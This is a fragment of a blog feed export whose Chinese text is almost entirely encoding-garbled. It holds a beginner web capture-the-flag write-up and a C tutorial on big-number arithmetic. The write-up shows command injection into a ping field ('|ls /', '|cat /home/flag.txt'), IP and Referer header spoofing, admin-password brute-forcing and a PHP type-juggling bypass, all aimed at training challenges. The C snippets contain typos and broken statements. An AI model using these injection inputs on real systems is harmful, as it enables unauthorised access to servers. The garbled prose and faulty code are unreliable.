çŸ¥é“index.phpçš„å¤‡ä»½æ–‡ä»¶å—ï¼Œä¸€èˆ¬å¤‡ä»½æ–‡ä»¶çš„åç¼€åä¸ºï¼šâ€.gitâ€,â€.svnâ€,â€.~â€,â€.bakâ€,â€.bash_histroyâ€,â€.bkfâ€;ç»™index.phptæ·»åŠ å¤‡ä»½æ–‡ä»¶çš„åç¼€åè¿›è¡Œå°è¯•å°±å¯ä»¥æ‰¾é“index.phpçš„å¤‡ä»½æ–‡ä»¶ä¸ºindex.php.bakæ‰“å¼€ç½‘é¡µæ‰€æä¾›çš„bakæ–‡ä»¶å°±å¯ä»¥æ‰¾åˆ°flag</p><h2 id="5-cookie"><a href="#5-cookie" class="headerlink" title="5.cookie"></a>5.cookie</h2><p>æˆ‘å…ˆç®€å•ä»‹ç»ä¸€ä¸‹cookieï¼Œcookieæ˜¯ä¸€ä¸ªå°å‹æ–‡ä»¶ï¼Œç½‘ç«™ä¼šå°†ä¸€äº›ä¿¡æ¯å­˜åœ¨cookieä¸­å¦‚æˆ‘ä»¬åœ¨æ‰“å¼€è§†é¢‘ç½‘ç«™æ—¶å‘ç°æˆ‘ä»¬å¯ä»¥ç›´æ¥ç™»é™†ä¸Šæ¬¡æ‰€ç™»é™†çš„è´¦å·ï¼Œè¿™å°±æ˜¯å°†è´¦å·å¯†ç å­˜é“äº†æœ¬åœ°çš„cookieä¸­ï¼Œä¸€èˆ¬cookieæ˜¯ç»è¿‡äº†åŠ å¯†çš„ï¼Œå¯æ˜¯è¿™ä¹Ÿç•™ä¸‹äº†ä¸€äº›å®‰å…¨éšæ‚£å°±æ˜¯é»‘å®¢å¯ä»¥ç›´æ¥é€šè¿‡è·å–ä½ ç”µè„‘çš„cookieåè¿›è¡Œç ´å¯†æ¥å¾—åˆ°ä¿¡æ¯ã€‚</p><p>è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥é€šè¿‡f12æ‰“å¼€æ§åˆ¶å°ï¼Œå…ˆæŸ¥çœ‹æºç å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼Œç„¶åæˆ‘ä»¬æ‰“å¼€ç½‘ç»œé€‰é¡¹å¯¹ç½‘é¡µæ´»åŠ¨è¿›è¡Œè®°å½•ï¼Œåœ¨set-cookieæ ‡å¤´é‡Œæ‰¾çš„lookhere=cookie.phpå‘ç°è€Œååœ¨urlä¸Šæ·»åŠ cookie.phpå°±å¯ä»¥è½¬åˆ°å¦ä¸€ä¸ªç½‘ç«™ä¸Šé¢å†™ç€see the http response<br>æ„æ€æ˜¯æŸ¥çœ‹å“åº”ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½åœ¨å“åº”æ ‡å¤´é‡Œæ‰¾åˆ°flag</p><h2 id="6-disabled-button"><a href="#6-disabled-button" class="headerlink" title="6.disabled_button"></a>6.disabled_button</h2><p>è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å°ç‚¹å‡»å·¦ä¸Šè§’çš„å›¾æ ‡ï¼Œä¹‹åå°±å¯ä»¥å°†é¼ æ ‡ç§»åŠ¨çš„æŒ‰é’®ä¸ŠæŸ¥çœ‹æŒ‰é’®çš„æºç ä½ç½®æŸ¥çœ‹æ— æ³•ç‚¹å‡»çš„åŸå› ï¼Œæˆ‘ä»¬ä¼šå‘ç°æˆ‘ä»¬åœ¨æºç é‡Œå‘ç°<code>disabled</code> è¿™ä¸ªä¼šä½¿ä¹‹åå¯¼è‡´æˆ‘ä»¬æ— æ³•ä¸æŒ‰é’®è¿™ä¸ªæ§ä»¶è¿›è¡Œäº¤äº’å¯¼è‡´æ— æ³•æäº¤postè¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨æ§åˆ¶å°ä¸­å°†disabledåˆ é™¤ç„¶åå°±å¯ä»¥å¯¹æŒ‰é’®è¿›è¡Œç‚¹å‡»äº†ï¼Œç‚¹å‡»ä¹‹åå¾—åˆ°flag</p><h2 id="7-çœ‹ä¸æ‡‚jså…ˆè·³è¿‡åè¡¥"><a href="#7-çœ‹ä¸æ‡‚jså…ˆè·³è¿‡åè¡¥" class="headerlink" title="7.çœ‹ä¸æ‡‚jså…ˆè·³è¿‡åè¡¥"></a>7.çœ‹ä¸æ‡‚jså…ˆè·³è¿‡åè¡¥</h2><h2 id="8-xff-referer"><a href="#8-xff-referer" class="headerlink" title="8.xff_referer"></a>8.xff_referer</h2><p>è¿™é“é¢˜ç›®æˆ‘ä»¬åªéœ€è¦ç”¨hackbarå°±å¯ä»¥è§£å†³ï¼Œæ‰“å¼€è¿™é“é¢˜åé¢˜ç›®è¦æ±‚ipåœ°å€ä¸º123.123.123.123è¿™æ—¶å€™æˆ‘ä»¬å°±è¦ç”¨é“<code>XFF</code>ä¹Ÿå°±æ˜¯<code>X-Forwarded-For</code>,XFFæ˜¯ä¸€ç§ipè¯·æ±‚å¤´æˆ‘ä»¬å¯ä»¥åœ¨hackbarçš„modlfy headeré‡Œè¿›è¡Œå¯¹XFFçš„ä¿®æ”¹åªè¦åœ¨hackbaré‡Œæ·»åŠ ä»¥ä¸‹ä»£ç å°±å¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br></pre></td></tr></table></figure><br>éšåä¼šè¦æ±‚å¿…é¡»æ¥è‡ªè°·æ­Œ<br>è¿™æ—¶æˆ‘ä»¬è¦ç”¨åˆ°å¦ä¸€ç§æ ‡å¤´å°±æ˜¯ï¼ŒRefererï¼Œåªæœ‰ç”¨hackbarå¯¹è¿™ä¸ªæ ‡å¤´è¿›è¡Œä¿®æ”¹å°±å¯ä»¥å®Œæˆé¢˜ç›®è¦æ±‚ä»£ç å¦‚ä¸‹<br>Referer:<a href="https://www.google.com">https://www.google.com</a><br>è¿™æ ·å°±æ‹¿åˆ°flagäº†</p><h2 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h2><p>è¿™é¢˜ç‚¹è¿›å»æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢æˆ‘ä»¬é¦–å…ˆéšä¾¿è¾“å…¥ä¸€ç»„è´¦å·å¯†ç ï¼Œè€Œåå¼¹å‡ºplease login as adminï¼Œæˆ‘ä»¬å…ˆçŒœä¸€ä¸‹è´¦å·ä¸ºadminè€Œåæˆ‘ä»¬é‡æ–°è¾“å…¥è´¦å·adminå’Œå¯†ç æ‰“å¼€bpå¯¹ç½‘é¡µè¿›è¡ŒæŠ“åŒ…åè¿›è¡Œçˆ†ç ´ï¼Œç”±äºè¿™ä¸ªå¯†ç æ˜¯å°æ˜éšä¾¿è®¾ç½®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç½‘ä¸Šä¸‹è½½ä¸€ä¸ªç®€å•å¯†ç æœ¬æ¥å¯¼å…¥bpè§£å†³çˆ†ç ´ï¼Œåå¾—åˆ°çˆ†ç ´ç»“æœä¸ºadmin 123456</p><h2 id="10-command-execution"><a href="#10-command-execution" class="headerlink" title="10.command_execution"></a>10.command_execution</h2><p>å°æ˜å†™äº†ä¸ªpingä½†æ˜¯æ²¡æœ‰wafè¿™å°±ä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨pingé‡Œè¾“å…¥æŒ‡ä»¤ç›´æ¥æŸ¥çœ‹æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œé¦–å…ˆè¾“å…¥<code>|ls</code>çœ‹è§å±å¹•ä¸Šå›æ˜¾å‡ºindex.txtè¯æ˜äº†å› ä¸ºæ²¡æœ‰é˜²ç«å¢™lså¹¶æ²¡è¢«è¿‡æ»¤ä¹‹åè¾“å…¥1<code>|ls /</code>æ¥æŸ¥çœ‹æ–‡ä»¶ç›®å½•ï¼Œä¹‹åç”¨<code>|ls /æ–‡ä»¶å</code>æŸ¥æ‰¾flag,æ‰¾åˆ°flagæ˜¯åœ¨homeä¸‹ï¼Œä¹‹ååœ¨ä½¿ç”¨<code>|cat /home/flag.txt</code>å¾—åˆ°flag</p><h2 id="11-simple-php"><a href="#11-simple-php" class="headerlink" title="11.simple_php"></a>11.simple_php</h2><p>è¿™é“é¢˜ç›®ä¸»è¦è€ƒçš„æ˜¯phpä»£ç ä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°éœ€è¦ç»™aèµ‹å€¼ä¸€ä¸ª0å¾—åˆ°flag1ï¼Œbä¼ å€¼ä¸€ä¸ªå¤§ä¸1234çš„æ•°å¾—åˆ°flag2.<br>å¯æ˜¯æˆ‘ä»¬å‘ç°ä»£ç é‡Œæœ‰ä¸ª<code>is_numeric()</code>è¿™ä¸ªä»£ç æ˜¯åˆ†ææ˜¯ä¸ºæ•°å­—æ˜¯è¿”å›turnä¸æ˜¯è¿”å›falseï¼Œå½“bä¸ºæ•°å­—æ—¶å°±å°†è¿è¡Œexitï¼ˆï¼‰ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç›´æ¥ç»“æŸç¨‹åºï¼Œå¦‚æœbç›´æ¥è¾“å…¥æ•°å­—é‚£ä¹ˆå°†æ— æ³•å¾—åˆ°flag2.æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•ç»•è¿‡is_numericå‡½æ•°<br>é¦–å…ˆæˆ‘ä»¬éƒ½çŸ¥é“phpæ¯”è¾ƒæ˜¯æ¯”è¾ƒè¯¡å¼‚çš„ï¼Œphpä¸­å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒä¼šå°†å­—ç¬¦å‹å°è¯•è½¬ä¸ºæ•´å½¢/æµ®ç‚¹å‹å¦‚12345aå’Œ1234æ¯”è¾ƒåœ¨phpä¸­ä¼šå˜æˆ12345å’Œ1234è¿›è¡Œæ¯”è¾ƒæ‰€æœ‰æˆ‘ä»¬å°±å¯ä»¥ç»™bèµ‹å€¼ä¸€ä¸ª12345aæ¥ç»•è¿‡is_numericäº†ã€‚<br>åœ¨urlä¸Šè¾“å…¥ä¸€ä¸‹ä»£ç å°±å¯ä»¥å¾—åˆ°flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=0 &amp; b=12345a</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é«˜ç²¾åº¦ç®—æ³•</title>
      <link href="/2023/10/29/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95/"/>
      <url>/2023/10/29/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="å…³ä¸é«˜ç²¾åº¦ç®—æ³•çš„å­¦ä¹ "><a href="#å…³ä¸é«˜ç²¾åº¦ç®—æ³•çš„å­¦ä¹ " class="headerlink" title="å…³ä¸é«˜ç²¾åº¦ç®—æ³•çš„å­¦ä¹ "></a>å…³ä¸é«˜ç²¾åº¦ç®—æ³•çš„å­¦ä¹ </h1><h2 id="è¿™ç¯‡åšæ–‡ä¼šè®°è½½æˆ‘å­¦ä¹ cè¯­è¨€é«˜ç²¾åº¦ç®—æ³•çš„è¿‡ç¨‹ï¼Œæˆ‘ä¼šå°†æˆ‘å­¦ä¹ çš„å†…å®¹è¾“å‡ºçš„è¿™ç¯‡åšæ–‡ä¹‹ä¸‹ã€‚"><a href="#è¿™ç¯‡åšæ–‡ä¼šè®°è½½æˆ‘å­¦ä¹ cè¯­è¨€é«˜ç²¾åº¦ç®—æ³•çš„è¿‡ç¨‹ï¼Œæˆ‘ä¼šå°†æˆ‘å­¦ä¹ çš„å†…å®¹è¾“å‡ºçš„è¿™ç¯‡åšæ–‡ä¹‹ä¸‹ã€‚" class="headerlink" title="è¿™ç¯‡åšæ–‡ä¼šè®°è½½æˆ‘å­¦ä¹ cè¯­è¨€é«˜ç²¾åº¦ç®—æ³•çš„è¿‡ç¨‹ï¼Œæˆ‘ä¼šå°†æˆ‘å­¦ä¹ çš„å†…å®¹è¾“å‡ºçš„è¿™ç¯‡åšæ–‡ä¹‹ä¸‹ã€‚"></a>è¿™ç¯‡åšæ–‡ä¼šè®°è½½æˆ‘å­¦ä¹ cè¯­è¨€é«˜ç²¾åº¦ç®—æ³•çš„è¿‡ç¨‹ï¼Œæˆ‘ä¼šå°†æˆ‘å­¦ä¹ çš„å†…å®¹è¾“å‡ºçš„è¿™ç¯‡åšæ–‡ä¹‹ä¸‹ã€‚</h2><p> é«˜ç²¾åº¦é¡¾åæ€ä¹‰å°±æ˜¯å°†é•¿åˆ°longlongéƒ½æ— æ³•å‚¨å­˜çš„æ•°å­—å­˜å‚¨åˆ°æ•°ç»„å†…è¿›è¡Œå››åˆ™è¿ç®—ã€‚<br> åŸç†å…¶å®å’Œå°å­¦å­¦çš„ç«–å¼å¯ä»¥è¯´ä¸€æ¨¡ä¸€æ ·ã€‚æ¯ä¸€ä½ç›¸åŠ å¤§äº10è¿›1ã€‚å®ç°è¿™ä¸ªçš„ä»£ç å¦‚ä¸‹<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr3[i]=arr[i]arr1[i]+arr2[i];</span><br><span class="line">arr3[i+<span class="number">1</span>]=arr3[i]/<span class="number">10</span>;</span><br><span class="line">arr3[i]=arr3[i]%<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>å½“ç„¶æˆ‘ä»¬éƒ½çŸ¥é“å­—ç¬¦å‹æ•°ç»„é‡Œçš„å…ƒç´ æ˜¯æ— æ³•è¿›è¡Œå››åˆ™è¿ç®—çš„æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´å½¢æ•°ç»„ä¸»è¦æ“ä½œå¦‚ä¸‹ï¼ˆ<strong>ç”±äºåœ¨å¾ªç¯æ—¶æˆ‘ä»¬ä¹ æƒ¯å°†iä»å°åˆ°å¤§è¿›è¡Œ++æ‰€ä»¥æˆ‘ä»¬åœ¨å°†å­—ç¬¦ä¸²å­˜å‚¨åœ¨æ•´å½¢æ•°ç»„é‡Œæ—¶éœ€è¦ä»¥ä¸‹ä»£ç çš„æ“ä½œå°±æ˜¯å°†å­—ç¬¦ä¸²åå‘å­˜å‚¨åˆ°æ•´å½¢æ•°ç»„ä¸­</strong>ï¼‰<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>ï¼›</span><br><span class="line"><span class="comment">//arr1å’Œarr2ä¸ºå­—ç¬¦ä¸²æ•°ç»„ </span></span><br><span class="line"><span class="comment">//arr3å’Œarr4ä¸ºæ•´å½¢æ•°ç»„</span></span><br><span class="line">s1=<span class="built_in">strlen</span>(arr1);</span><br><span class="line">s2=<span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s1;i++)</span><br><span class="line">&#123;</span><br><span class="line">arr3[s1-i]=arr1[i]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//å°†å­—ç¬¦ä¸²çš„æ•°å­—åå‘å­˜å‚¨åˆ°æ•´å½¢æ•°ç»„ä¸­,ä½¿arr3[1]æ˜¯ä¸ªä½ä¸Šçš„æ•°</span></span><br><span class="line">&#125;</span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s2;i++)</span><br><span class="line">&#123;</span><br><span class="line">    arr4[s2-i]=arr2[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ä»¥ä¸Šä¸¤ä¸ªç¨‹åºå°±å¯ä»¥å†™å‡ºé«˜ç²¾åº¦åŠ æ³•äº†ï¼ˆ<strong>ä»£ç å¦‚ä¸‹</strong>ï¼‰<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[<span class="number">1000</span>] = &#123;<span class="string">&quot;0&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> arr2[<span class="number">1000</span>] = &#123;<span class="string">&quot;0&quot;</span>&#125;;</span><br><span class="line"><span class="type">int</span> arr3[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> arr4[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, arr1, arr2);</span><br><span class="line"><span class="type">int</span> s1 = <span class="built_in">strlen</span>(arr1);</span><br><span class="line"><span class="type">int</span> s2 = <span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="comment">//å°†å­—ç¬¦ä¸²è½¬æ¢</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;i &lt; s1;i++)</span><br><span class="line">&#123;</span><br><span class="line">arr3[s1-i]=arr1[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">for</span> (;j &lt; s2;j++)</span><br><span class="line">&#123;</span><br><span class="line">arr4[s2-j] = arr2[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (s1 &gt;= s2)</span><br><span class="line">max = s1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">max = s2;</span><br><span class="line"><span class="type">int</span> add[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt;= max;i++)</span><br><span class="line">&#123;</span><br><span class="line">add[i] = add[i] + arr3[i] + arr4[i];</span><br><span class="line">add[i + <span class="number">1</span>] = add[i] / <span class="number">10</span>;</span><br><span class="line">add[i] = add[i] % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">i = max;</span><br><span class="line"><span class="keyword">for</span> (;i&gt;<span class="number">0</span>;i--)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, add[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä»¥ä¸Šä»£ç å°±æ˜¯é«˜ç²¾åº¦åŠ æ³•äº†</p><h2 id="åŠ æ³•ä¹‹åè‡ªç„¶å°±æ˜¯å‡æ³•äº†"><a href="#åŠ æ³•ä¹‹åè‡ªç„¶å°±æ˜¯å‡æ³•äº†" class="headerlink" title="åŠ æ³•ä¹‹åè‡ªç„¶å°±æ˜¯å‡æ³•äº†"></a>åŠ æ³•ä¹‹åè‡ªç„¶å°±æ˜¯<strong>å‡æ³•</strong>äº†</h2><h4 id="ç›¸ä¿¡å„ä½éƒ½æœ‰æ”»è¯»è¿‡å°å­¦å­¦å†å§ï¼Œé‚£ä¹ˆæ”»è¯»è¿‡å°å­¦å­¦ä½çš„å„ä½åº”è¯¥çŸ¥é“ï¼Œåœ¨å°å­¦æ˜¯æ²¡æœ‰è´Ÿæ•°çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦å…ˆæ¯”ä¸¤ä¸ªæ•°ç»„çš„å¤§å°åå¯¹æ•°ç»„è¿›è¡Œäº¤æ¢"><a href="#ç›¸ä¿¡å„ä½éƒ½æœ‰æ”»è¯»è¿‡å°å­¦å­¦å†å§ï¼Œé‚£ä¹ˆæ”»è¯»è¿‡å°å­¦å­¦ä½çš„å„ä½åº”è¯¥çŸ¥é“ï¼Œåœ¨å°å­¦æ˜¯æ²¡æœ‰è´Ÿæ•°çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦å…ˆæ¯”ä¸¤ä¸ªæ•°ç»„çš„å¤§å°åå¯¹æ•°ç»„è¿›è¡Œäº¤æ¢" class="headerlink" title="ç›¸ä¿¡å„ä½éƒ½æœ‰æ”»è¯»è¿‡å°å­¦å­¦å†å§ï¼Œé‚£ä¹ˆæ”»è¯»è¿‡å°å­¦å­¦ä½çš„å„ä½åº”è¯¥çŸ¥é“ï¼Œåœ¨å°å­¦æ˜¯æ²¡æœ‰è´Ÿæ•°çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦å…ˆæ¯”ä¸¤ä¸ªæ•°ç»„çš„å¤§å°åå¯¹æ•°ç»„è¿›è¡Œäº¤æ¢"></a>ç›¸ä¿¡å„ä½éƒ½æœ‰æ”»è¯»è¿‡å°å­¦å­¦å†å§ï¼Œé‚£ä¹ˆæ”»è¯»è¿‡å°å­¦å­¦ä½çš„å„ä½åº”è¯¥çŸ¥é“ï¼Œåœ¨å°å­¦æ˜¯æ²¡æœ‰è´Ÿæ•°çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦å…ˆæ¯”ä¸¤ä¸ªæ•°ç»„çš„å¤§å°åå¯¹æ•°ç»„è¿›è¡Œäº¤æ¢</h4><p>ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> arr1[<span class="number">10000</span>] = &#123; <span class="string">&quot;0&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span> arr2[<span class="number">10000</span>] = &#123; <span class="string">&quot;0&quot;</span> &#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, &amp;arr1, &amp;arr2);</span><br><span class="line"><span class="type">int</span> s1 = <span class="built_in">strlen</span>(arr1);</span><br><span class="line"><span class="type">int</span> s2 = <span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (arr1[<span class="number">0</span>]&lt;arr2[<span class="number">0</span>] &amp;&amp; s1 == s2 || s2&gt;s1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (;i &lt; s2;i++)</span><br><span class="line">&#123;</span><br><span class="line">t = arr2[i];</span><br><span class="line">arr2[i] = arr1[i];</span><br><span class="line">arr1[i] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è€Œåä¸åŠ æ³•ç›¸åŒå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´å½¢æ•°ç»„ã€‚ä»£ç å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>ï¼›</span><br><span class="line"><span class="comment">//arr1å’Œarr2ä¸ºå­—ç¬¦ä¸²æ•°ç»„ </span></span><br><span class="line"><span class="comment">//arr3å’Œarr4ä¸ºæ•´å½¢æ•°ç»„</span></span><br><span class="line">s1=<span class="built_in">strlen</span>(arr1);</span><br><span class="line">s2=<span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s1;i++)</span><br><span class="line">&#123;</span><br><span class="line">arr3[s1-i]=arr1[i]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//å°†å­—ç¬¦ä¸²çš„æ•°å­—åå‘å­˜å‚¨åˆ°æ•´å½¢æ•°ç»„ä¸­,ä½¿arr3[1]æ˜¯ä¸ªä½ä¸Šçš„æ•°</span></span><br><span class="line">&#125;</span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s2;i++)</span><br><span class="line">&#123;</span><br><span class="line">    arr4[s2-i]=arr2[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¹‹åå°±æ˜¯ç»å…¸çš„å°å­¦è¿ç®—äº†ã€‚è¿ç®—æ–¹å¼å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾arr1ä¸arr2ä¸ºå·²ç»è½¬æ¢ä¸ºæ•´å‹æ•°ç»„çš„æ•°ç»„</span></span><br><span class="line"><span class="keyword">if</span>(arr1[i]&lt;aarr2[i])</span><br><span class="line">&#123;</span><br><span class="line">    arr1[i+<span class="number">1</span>]--;</span><br><span class="line">    arr[i]+=<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">arr3[i]=arr3[i]+arr1[i]-arr2[i];</span><br><span class="line">arr3[i+<span class="number">1</span>]=arr3[i]/<span class="number">10</span>;</span><br><span class="line">arr3[i]=arr[i]%<span class="number">10</span>ï¼›</span><br></pre></td></tr></table></figure><br>å°†ä»¥ä¸Šä»£ç ç»“åˆèµ·æ¥å°±æ˜¯é«˜ç²¾åº¦å‡æ³•çš„å…¨éƒ¨äº†ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯­æ³•æ’åº</title>
      <link href="/2023/10/29/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2023/10/29/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
